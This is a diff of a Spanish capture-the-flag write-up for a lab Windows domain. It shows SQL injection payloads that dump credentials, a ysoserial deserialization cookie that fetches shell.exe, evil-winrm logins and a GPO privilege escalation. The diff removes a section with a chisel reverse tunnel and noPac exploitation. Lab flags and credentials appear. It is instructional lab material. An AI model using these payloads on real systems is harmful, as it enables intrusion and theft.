@@ -1,10 +1,5 @@
-
-
 ### But we have SSL!?
 
-#### CONTEXT{s3cur1ty_thr0ugh_0bscur1ty}
-
-  
 
 Iniciamos la máquina escaneando los puertos de la máquina con `nmap` donde encontramos varios puertos abiertos, y al lanzar algunos `scripts` de propios nmap mssql nos muestra el nombre del equipo y al `dominio` que pertenece
 
@@ -31,61 +26,25 @@ PORT     STATE SERVICE
 
 Tenemos el puerto `443` abierto, esta corriendo un servicio `https`, en el navegador podemos ver una pagina `web` bastante simple aunque con varias pestañas en ella
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/context/1.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/context/1.png)
+![image](../../../Imágenes/20250521163532.png)
 
 Podemos ver una pestaña `Staff` que realmente solo nos muestra algunos `usuarios`
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/context/2.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/context/2.png)
+![image](../../../Imágenes/20250521163546.png)
 
 Al mirar el `codigo` fuente podemos ver directamente la primera `flag`, ademas nos estan mostrando `credenciales` validas para el portal de admin, `jay.teignton:admin`
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/context/3.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/context/3.png)
-
-  
+![image](../../../Imágenes/20250521163615.png)
 
 ### That shouldn't be there...
 
-#### CONTEXT{d0_it_st0p_it_br34k_it_f1x_it}
-
-  
-
 En `/Admin` podemos iniciar sesión con las `credenciales` encontradas en el codigo
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/context/4.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/context/4.png)
+![image](../../../Imágenes/20250521163638.png)
 
 Ahora encontramos una pestaña con el nombre `Management` en donde encontramos una tabla con varios `productos` y tenemos la posibilidad de `agregar` uno nuevo
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/context/5.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/context/5.png)
+![image](../../../Imágenes/20250521163659.png)
 
 Despues de buscar un rato encontramos una `inyeccion sql`, iniciamos enumerando el nombre de la `base de datos` actualmente en uso, nos devuelve `webapp`
 
@@ -93,14 +52,7 @@ Despues de buscar un rato encontramos una `inyeccion sql`, iniciamos enumerando 
 '+(select db_name())+'  
 ```
 
-  
-[
-
-![](https://xchg2pwn.github.io/fortresses/context/6.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/context/6.png)
+![image](../../../Imágenes/20250521163720.png)
 
 Enumerando las los objetos de `webapp` especificamente que sean del tipo `tablas` podemos encontrar una llamada `users` que generalmente contiene credenciales
 
@@ -109,13 +61,7 @@ Enumerando las los objetos de `webapp` especificamente que sean del tipo `tablas
 ```
 
   
-[
-
-![](https://xchg2pwn.github.io/fortresses/context/7.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/context/7.png)
+![image](../../../Imágenes/20250521163734.png)
 
 Al leer el campo `username` de la tabla users nos devuelve el usuario `abbie.buckfast`
 
@@ -123,14 +69,7 @@ Al leer el campo `username` de la tabla users nos devuelve el usuario `abbie.buc
 '+(select top 1 username from users order by username)+'  
 ```
 
-  
-[
-
-![](https://xchg2pwn.github.io/fortresses/context/8.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/context/8.png)
+![image](../../../Imágenes/20250521163750.png)
 
 Hacemos lo mismo con el campo `password` y ahora nos devuelve `AMkru$3_f'/Q^7f?`
 
@@ -139,13 +78,7 @@ Hacemos lo mismo con el campo `password` y ahora nos devuelve `AMkru$3_f'/Q^7f?`
 ```
 
   
-[
-
-![](https://xchg2pwn.github.io/fortresses/context/9.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/context/9.png)
+![image](../../../Imágenes/20250521163813.png)
 
 Además de credenciales que encontramos tambien podemos encontrar la `flag`
 
@@ -153,22 +86,10 @@ Además de credenciales que encontramos tambien podemos encontrar la `flag`
 '+(select password from users order by username offset 2 rows fetch next 1 rows only)+'  
 ```
 
-  
-[
-
-![](https://xchg2pwn.github.io/fortresses/context/10.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/context/10.png)
-
-  
+![image](../../../Imágenes/20250521163836.png)  
 
 ### Have we met before?
 
-#### CONTEXT{wh00000_4re_y0u?}
-
-  
 
 Aplicando un poco de fuerza bruta hacia la web nos encontramos entre otros con un directorio `/owa` que devuelve nos un codigo de estado `302` redirect
 
@@ -200,71 +121,29 @@ ID           Response   Lines    Word       Chars       Payload
 
 Al abrir `/owa` en la web podemos ver un panel de `login` para Outlook Web Access
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/context/11.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/context/11.png)
-
+![image](../../../Imágenes/20250521163926.png)
 Podemos iniciar sesión con las `credenciales` que hemos conseguido a traves de la `sql injection`, las cuales son las siguientes `abbie.buckfast:AMkru$3_f'/Q^7f?`
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/context/12.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/context/12.png)
+![image](../../../Imágenes/20250521163949.png)
 
 Son válidas y conseguimos acceso aunque no tenemos ningun `correo` pendiente, sin embargo tenemos una pestaña donde podemos abrir el `email` de otro `usuario`
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/context/13.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/context/13.png)
+![image](../../../Imágenes/20250521164003.png)
 
 Uno de los `usuarios` encontrados en el panel del inicio fue el usuario `jay.teignton` el cual tiene un `email` al cual podemos cambiar y leer todos sus `correos`
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/context/14.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/context/14.png)
+![image](../../../Imágenes/20250521164012.png)
 
 En los correos `enviados` encontramos la `flag` en un correo que el usuario `jay.teignton` ha enviado a el usuario `andy.teignton` con el asunto `flag.txt`
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/context/15.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/context/15.png)
-
-  
+![image](../../../Imágenes/20250521164021.png)
 
 ### Is it a bird? Is it a plane?
 
-#### CONTEXT{uNs4fe_deceri4liz3r5?!_th33333yre_gr8}
-
-  
 
 En lo `correos` recibidos tenemos uno de `karl.memaybe` el cual nos dice que hubo un hackeo, ademas este nos comparte un `zip` con el `codigo fuente` del proyecto
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/context/16.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/context/16.png)
+![image](../../../Imágenes/20250521164041.png)
 
 Analizando el `codigo` encontramos que este toma el valor de la cookie `Profile`, decodea su valor de `base64` y usa `JavaScriptSerializer` para deserializarla
 
@@ -326,13 +205,7 @@ PS C:\CTF\ysoserial>
 
 Ahora en la web principal creamos una `cookie` con el nombre `Profile` donde como valor le pasaremos todo nuestro `payload` serializado y encodeado en `base64`
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/context/17.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/context/17.png)
+![image](../../../Imágenes/20250521164052.png)
 
 Al `recargar` la pagina recibimos una petición al archivo `shell.exe` esto significa que se ha ejecutado el `comando` y ha descargado el archivo exe que hemos creado
 
@@ -391,15 +264,8 @@ CONTEXT{uNs4fe_deceri4liz3r5?!_th33333yre_gr8}
 PS C:\Users\Public>
 ```
 
-  
-
-  
-
 ### This looks bad!
 
-#### CONTEXT{g1mm2_g1mm3_g1mm4_y0ur_cr3d1t}
-
-  
 
 En `C:\` encontramos un directorio `Logs` que dentro tiene un directorio `WEBDB` que dentro tiene varios archivos de `log` probablemente de la base de datos de la web
 
@@ -663,14 +529,7 @@ file: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Win
 
 Al abrir el `dll` con [dnspy](https://github.com/dnSpy/dnSpy) encontramos una función `BackupClients` la cual define `credenciales` a nivel de sistema para llamar mas adelante al archivo `clients.html`
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/context/18.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/context/18.png)
-
+![image](../../../Imágenes/20250521164121.png)
 Las `credenciales` son a nivel de sistema y el puerto `5985`, asi que nos podemos conectar con `evil-winrm` y conseguir una `shell` como el usuario `jay.teignton`
 
 ```
@@ -714,13 +573,7 @@ PS C:\Users\jay.teignton\Documents>
 
 Al abrir el `exe` con `dnspy` encontramos una función `Start` que parece la principal
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/context/19.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/context/19.png)
+![image](../../../Imágenes/20250521164132.png)
 
 La función inicia un `socket` en el puerto `7734`, despues comprueba que la función `CheckClientPassword` devuelva true si es asi pasa a la función `CheckClientCommand`
 
@@ -894,15 +747,8 @@ teignton\andy.teignton
 PS C:\Windows\system32>
 ```
 
-  
-
-  
-
 ### Key to the castle
 
-#### CONTEXT{OU_4bl3_t0_k33p_4_s3cret?}
-
-  
 
 Después de buscar formas de escalar privilegios encontramos que podemos crear un `Group Policy Object`, asi que creamos un nuevo objeto con el nombre `privesc`
 
@@ -1108,69 +954,3 @@ CONTEXT{OU_4bl3_t0_k33p_4_s3cret?}
 PS C:\Users\Administrator\Documents>
 ```
 
-  
-
-  
-
-### Extra
-
-#### CVE-2021-42278 / CVE-2021-42287 - Administrator
-
-  
-
-Una via alternativa es usar [noPac](https://github.com/Ridter/noPac), sin embargo puertos que necesitamos como `445` y `88` solo estan disponibles de forma interna asi que iniciamos creando un `proxy`
-
-```
-PS C:\Users\jay.teignton\Documents> .\chisel.exe client 10.10.14.10:9999 R:socks  
-```
-
-  
-
-```
-❯ chisel server --reverse --port 9999
-server: Reverse tunnelling enabled
-server: Listening on http://0.0.0.0:9999
-server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening  
-```
-
-  
-
-Una vez creado el proxy con chisel podemos tirar [noPac](https://github.com/Ridter/noPac), con el parametro `-shell` nos otorgara una cmd como el usuario `nt authority\system` directamente en el `DC`
-
-```
-❯ proxychains -q python3 noPac.py teignton.htb/jay.teignton:D0ntL0seSk3l3tonK3y! -shell -use-ldap -dc-ip 10.13.37.12  
-
-███    ██  ██████  ██████   █████   ██████ 
-████   ██ ██    ██ ██   ██ ██   ██ ██      
-██ ██  ██ ██    ██ ██████  ███████ ██      
-██  ██ ██ ██    ██ ██      ██   ██ ██      
-██   ████  ██████  ██      ██   ██  ██████ 
-    
-[*] Current ms-DS-MachineAccountQuota = 10
-[*] Selected Target web.teignton.htb
-[*] Total Domain Admins 1
-[*] will try to impersonate Administrator
-[*] Adding Computer Account "WIN-MLF5VZHUDBC$"
-[*] MachineAccount "WIN-MLF5VZHUDBC$" password = Z2ZlBB)bvybY
-[*] Successfully added machine account WIN-MLF5VZHUDBC$ with password Z2ZlBB)bvybY.
-[*] WIN-MLF5VZHUDBC$ object = CN=WIN-MLF5VZHUDBC,CN=Computers,DC=TEIGNTON,DC=HTB
-[*] WIN-MLF5VZHUDBC$ sAMAccountName == web
-[*] Saving a DC's ticket in web.ccache
-[*] Reseting the machine account to WIN-MLF5VZHUDBC$
-[*] Restored WIN-MLF5VZHUDBC$ sAMAccountName to original value
-[*] Using TGT from cache
-[*] Impersonating Administrator
-[*] 	Requesting S4U2self
-[*] Saving a user's ticket in Administrator.ccache
-[*] Rename ccache to Administrator_web.teignton.htb.ccache
-[*] Attempting to del a computer with the name: WIN-MLF5VZHUDBC$
-[-] Delete computer WIN-MLF5VZHUDBC$ Failed! Maybe the current user does not have permission.
-[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
-[*] Exploiting..
-[!] Launching semi-interactive shell - Careful what you execute
-
-C:\Windows\system32>whoami
-nt authority\system
-
-C:\Windows\system32>
-```
